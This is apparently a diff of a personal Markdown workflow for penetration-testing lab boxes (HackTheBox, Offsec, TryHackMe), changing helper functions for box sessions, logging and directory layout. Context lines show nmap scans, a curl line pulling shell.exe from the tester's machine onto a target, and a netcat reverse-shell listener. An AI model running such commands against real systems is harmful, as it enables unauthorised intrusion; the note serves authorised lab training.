@@ -12,8 +12,9 @@ All shell functions live in `~/.zshrc`, no manual exports needed. Run `source ~/
 
 | Command | What it does |
 |---|---|
-| `boxstart <Name> <IP>` | First time on a box — creates dirs, writes `.env`, starts log |
-| `boxload <Name>` | Reconnect in new terminal — sources vars, stamps log |
+| `boxstart <Name> <IP> [htb\|offsec\|thm]` | First time on a box — creates dirs in `~/Platforms/`, writes `.env`, starts log |
+| `boxload [Name]` | Reconnect in new terminal — sources vars, stamps log (auto-runs on terminal open if marker exists) |
+| `boxdone` | Clear current-box marker + unset all vars |
 | `boxset <VAR> <value>` | Update a variable live + save to `.env` |
 | `loot cred <user> <pass>` | Save credential → `loot/creds.txt` |
 | `loot hash <user> <hash>` | Save hash → `loot/hashes.txt` |
@@ -32,29 +33,44 @@ All shell functions live in `~/.zshrc`, no manual exports needed. Run `source ~/
 ### First time on a new box
 
 ```bash
-boxstart <BoxName> <BoxIP>
+boxstart <BoxName> <BoxIP> [htb|offsec|thm]
 ```
 
 Example:
 ```bash
-boxstart Sea 10.10.11.28
+boxstart Sea 10.10.11.28 htb
 ```
 
+Platform shortcuts: `htb` = HackTheBox, `offsec` = Offsec, `thm` = TryHackMe. Defaults to `htb` if omitted.
+
 This does everything in one shot:
-- Creates `~/boxes/Sea/{nmap,loot,exploits,screenshots,www}/`
-- Writes all variables to `~/boxes/Sea/.env`
+- Creates `~/Platforms/HackTheBox/Sea/{nmap,loot,exploits,screenshots,www}/`
+- Writes all variables to `~/Platforms/HackTheBox/Sea/.env` (includes `BoxDir`, `BoxPlatform`)
 - Sources the `.env` immediately (all vars live in the current terminal)
 - `cd`s into the box directory
+- Writes `~/.current_box` so any new terminal auto-loads this box
 - Writes session start marker to `Sea.log`
 - Prints `LocalIP` so you can confirm VPN is up
 
 ### New terminal (same box, reconnecting)
 
 ```bash
-boxload <BoxName>
+boxload [BoxName]
 ```
 
 Sources `.env`, cds into the directory, stamps the log, refreshes `LocalIP` from `tun0`.
+
+**Auto-load:** if `~/.current_box` exists (written by `boxstart`/`boxload`), any new interactive terminal will auto-run `boxload` without typing anything. You'll see `[auto] box: Sea` on open.
+
+**Manual override:** `boxload Sea` always works and searches `~/Platforms/` across all platform directories.
+
+### Clearing a box session
+
+```bash
+boxdone
+```
+
+Deletes `~/.current_box` and unsets all box vars. New terminals will no longer auto-load. Run this when you're done with a box.
 
 ### Updating a variable when you find creds or a new port
 
@@ -71,8 +87,8 @@ Updates live in current terminal AND saves to `.env`, every future `boxload` pic
 ### Manual override (edge case)
 
 ```bash
-nano ~/boxes/$BoxName/.env
-source ~/boxes/$BoxName/.env
+nano $BoxDir/.env
+source $BoxDir/.env
 ```
 
 ---
@@ -88,13 +104,13 @@ source ~/.zshrc
 
 **2 — Spin up the box**
 ```bash
-boxstart <BoxName> <BoxIP>
+boxstart <BoxName> <BoxIP> [htb|offsec|thm]
 ```
-Creates dirs, writes `.env`, exports all vars, cds into `~/boxes/<BoxName>/`. Confirm `LocalIP` is shown and correct (VPN must be up).
+Creates dirs, writes `.env`, exports all vars, cds into `~/Platforms/<Platform>/<BoxName>/`. Confirm `LocalIP` is shown and correct (VPN must be up).
 
 **3 — Command logging is automatic**
 
-`preexec` in `.zshrc` stamps every command as `$ <command>` into `~/boxes/$BoxName/$BoxName.log` before it runs. No manual step needed, as long as `BoxName` is set (done by `boxstart`/`boxload`), commands are logged.
+`preexec` in `.zshrc` stamps every command as `$ <command>` into `$BoxDir/$BoxName.log` before it runs. No manual step needed, as long as `BoxName` and `BoxDir` are set (done by `boxstart`/`boxload`), commands are logged.
 
 > **Why not `script`?** `script` captures the PTY stream, which embeds your zsh prompt's escape sequences around every typed character. Cleaning those sequences destroys the command text. `preexec` writes directly to the file, bypassing the PTY, so commands land cleanly.
 
@@ -111,7 +127,7 @@ nmap -p- --min-rate 10000 -oA nmap/${BoxName}_allports $BoxIP
 
 **5 — UDP scan (open a second terminal, run in parallel)**
 ```bash
-boxload <BoxName>
+# New terminal auto-loads the box — just run the scan
 nmap -sU --top-ports 100 -oA nmap/${BoxName}_udp $BoxIP
 ```
 
@@ -127,6 +143,9 @@ nmap -sC -sV -p <ports> -oA nmap/${BoxName}_services $BoxIP
 
 ## Mid-Box: New Terminal
 
+New terminal auto-loads the current box from `~/.current_box` — no command needed. You'll see `[auto] box: <Name>` on open.
+
+If auto-load didn't fire (no marker, or you're in a non-interactive shell):
 ```bash
 boxload <BoxName>
 ```
@@ -213,7 +232,7 @@ curl:        curl http://$LocalIP:80/shell.exe -o shell.exe
 
 Copy the right one-liner, paste into the target shell. Ctrl+C the server when done.
 
-**Manual:** drop files into `~/boxes/$BoxName/www/` and run `www` to start the server.
+**Manual:** drop files into `$BoxDir/www/` and run `www` to start the server.
 
 **Listener (reverse shells):**
 ```bash
@@ -225,7 +244,7 @@ listener 9001     # nc -lnvp 9001
 
 ## During Enumeration — What to Note Down
 
-Keep a running scratch note (`~/boxes/$BoxName/notes.md`) with:
+Keep a running scratch note (`$BoxDir/notes.md`) with:
 - Open ports and services (copy from nmap output)
 - Software versions and anything searchsploit-able
 - Usernames found anywhere (files, headers, comments, web pages)
@@ -277,7 +296,7 @@ net localgroup administrators
 ## End of Box — Pre-Report Checklist
 
 Before writing the report, verify you have:
-- [ ] All screenshots named and in `~/boxes/$BoxName/screenshots/`
+- [ ] All screenshots named and in `$BoxDir/screenshots/`
 - [ ] All flags recorded in `loot/flags.txt`
 - [ ] All creds recorded in `loot/creds.txt`
 - [ ] The OSCP proof screenshot, run `proof linux|windows`, paste into target shell, `shot PROOF`
@@ -300,14 +319,14 @@ When you hit a technique on a box, these modules have the detail:
 
 | Area | Module |
 |------|--------|
-| Recon / enumeration | [[Information Gathering]], [[Vulnerability Scanning]] |
-| Web app attacks | [[Introduction to Web Application Attacks]], [[Common Web Application Attacks]] |
-| SQLi | [[SQL Injection Attacks]] |
-| File/client attacks | [[Client-Side Attacks]] |
-| Public exploits | [[Locating Public Exploits]], [[Fixing Exploits]] |
-| AV evasion | [[Antivirus Evasion]] |
-| Passwords / hashes | [[Password Attacks]] |
-| Linux privesc | [[Linux Privilege Escalation]] |
-| Windows privesc | [[Windows Privilege Escalation]] |
-| Pivoting | [[Port Redirection and SSH Tunneling]], [[Tunneling Through Deep Packet Inspection]] |
-| Active Directory | [[Active Directory Introduction and Enumeration]], [[Attacking Active Directory Authentication]], [[Lateral Movement in Active Directory]] |
+| Recon / enumeration | [[06. Information Gathering|Information Gathering]], [[07. Vulnerability Scanning|Vulnerability Scanning]] |
+| Web app attacks | [[08. Introduction to Web Application Attacks|Introduction to Web Application Attacks]], [[09. Common Web Application Attacks|Common Web Application Attacks]] |
+| SQLi | [[10. SQL Injection Attacks|SQL Injection Attacks]] |
+| File/client attacks | [[12. Client-Side Attacks|Client-Side Attacks]] |
+| Public exploits | [[13. Locating Public Exploits|Locating Public Exploits]], [[14. Fixing Exploits|Fixing Exploits]] |
+| AV evasion | [[15. Antivirus Evasion|Antivirus Evasion]] |
+| Passwords / hashes | [[16. Password Attacks|Password Attacks]] |
+| Linux privesc | [[18. Linux Privilege Escalation|Linux Privilege Escalation]] |
+| Windows privesc | [[17. Windows Privilege Escalation|Windows Privilege Escalation]] |
+| Pivoting | [[19. Port Redirection and SSH Tunneling|Port Redirection and SSH Tunneling]], [[20. Tunneling Through Deep Packet Inspection|Tunneling Through Deep Packet Inspection]] |
+| Active Directory | [[22. Active Directory Introduction and Enumeration|Active Directory Introduction and Enumeration]], [[23. Attacking Active Directory Authentication|Attacking Active Directory Authentication]], [[24. Lateral Movement in Active Directory|Lateral Movement in Active Directory]] |
